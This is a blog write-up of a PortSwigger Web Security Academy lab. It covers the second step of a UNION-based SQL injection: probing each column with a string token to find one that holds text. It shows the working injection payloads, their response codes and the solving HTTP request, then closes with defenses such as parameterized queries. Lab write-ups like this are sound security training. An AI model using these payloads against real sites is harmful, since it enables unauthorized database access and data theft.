---
title: "SQL injection UNION attack: finding a column containing text"
date: 2026-06-10 09:00:00 -0500
categories: [PortSwigger, SQL-injection]
tags: [portswigger, cwe-89, sql-injection, union, data-types]
description: "A PortSwigger Web Security Academy lab on the second step of a UNION-based SQL injection — finding a column whose data type can hold the text you want to exfiltrate."
image:
    path: /assets/Images/SQLi-UNION-Finding-Text-Column-avatar.png
    alt: SQLi UNION Finding Text Column
---

## Overview

This [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text) lab is the second step of a UNION-based [SQL injection](https://cwe.mitre.org/data/definitions/89.html). After you know how many columns the query returns, you need a column whose data type can actually hold **text** — the data you want to steal (usernames, passwords, version strings) is almost always a string. The lab proves you found one by asking you to make a random token appear in the response.

## The technique

The category filter concatenates input straight into a SQL `WHERE` clause ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)), so a single quote breaks out into SQL. A UNION attack requires the injected `SELECT` to match the original query's column count **and** compatible types. If you try to put a string into a numeric column, the database errors:

```
Conversion failed when converting the varchar value 'a' to data type int.
```

So the move is: place a string literal into each column position one at a time, leaving the rest `NULL`, and watch which one accepts it without error.

## Solution

With the column count already known to be 3 (`' UNION SELECT NULL,NULL,NULL-- -` → `200`), the lab supplied a random token to surface — `Jrdu98`. Probe each column:

```
GET /filter?category=Pets' UNION SELECT 'Jrdu98',NULL,NULL-- -   →  500  (column 1 is numeric)
GET /filter?category=Pets' UNION SELECT NULL,'Jrdu98',NULL-- -   →  200  + token reflected  ← text column
GET /filter?category=Pets' UNION SELECT NULL,NULL,'Jrdu98'-- -   →  500  (column 3 is numeric)
```

The working request that solved the lab:

```
GET /filter?category=Pets'+UNION+SELECT+NULL,'Jrdu98',NULL--+- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

A `500` means the column can't convert the string to its type; the `200` that echoes the token back is the string-compatible column — **column 2** here. The instant `Jrdu98` rendered in the product list, the lab status flipped to **Solved**.

## Why it worked

The application builds its SQL by string concatenation, so injected input is parsed as code. The difference between a clean `200` and a type-conversion `500` error leaks each column's data type, letting an attacker map out exactly where text can be exfiltrated through a UNION.

## Fix / defense

- **Parameterize every query** with prepared statements / bound parameters so user input is always data, never SQL — no column-type probing is possible.
- Use an ORM or query builder that parameterizes by default.
- **Suppress raw database errors.** The "convert varchar to int" message is precisely the oracle that reveals which columns are numeric versus string; return a generic error page instead.
